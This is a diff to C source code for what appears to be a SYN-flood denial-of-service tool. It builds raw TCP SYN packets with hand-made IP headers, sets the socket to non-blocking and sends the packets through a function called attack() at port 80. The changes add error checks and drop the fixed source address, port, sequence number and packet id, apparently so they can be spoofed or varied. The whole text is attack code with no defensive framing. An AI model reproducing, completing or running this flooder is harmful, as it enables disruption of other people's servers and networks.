@@ -55,6 +55,7 @@ int main(void) {
 	int dest_port = 80;
 
 	char* baseData = fillData(dest_ip, dest_port);
+
 	attack(fd, baseData);
 
 	return 0;
@@ -63,16 +64,23 @@ int main(void) {
 int createSocket(void) {
 	//Create a raw socket
 	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+	if(fd < 0) {
+		printf("Can't create raw socket");
+		exit(-1);
+	}
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
-	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
-		printf
-		    ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n",
-		     errno, strerror(errno));
-		exit(0);
+	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
+		printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
+		exit(-1);
 	}
+
+	//Set to non-block
 	int flags = fcntl(fd, F_GETFL, 0);
-	fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0){
+		printf("Can't set to non-block mode");
+		exit(-1);
+	}
 
 	return fd;
 }
@@ -94,22 +102,16 @@ char* fillData(char *dest_ip, int dest_port) {
 	iph->ihl = 5;
 	iph->tos = 0;
 	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-	iph->id = 0;	//Id of this packet
 	iph->frag_off = 0;
 	iph->ttl = 255;
 	iph->protocol = IPPROTO_TCP;
-	iph->check = 0;		//Set to 0 before calculating checksum
-	iph->saddr = inet_addr("127.0.0.1");
 	iph->daddr = inet_addr(dest_ip);
 
 	//TCP Header
-	tcph->source = htons(1080);
 	tcph->dest = htons(dest_port);
-	tcph->seq = 0;
 	tcph->ack_seq = 0;
 	tcph->doff = 5;		/* first and only tcp segment */
 	tcph->window = htons(65535);
-	tcph->check = 0;
 	tcph->urg_ptr = 0;
 	tcph->fin = 0;
 	tcph->syn = 1;
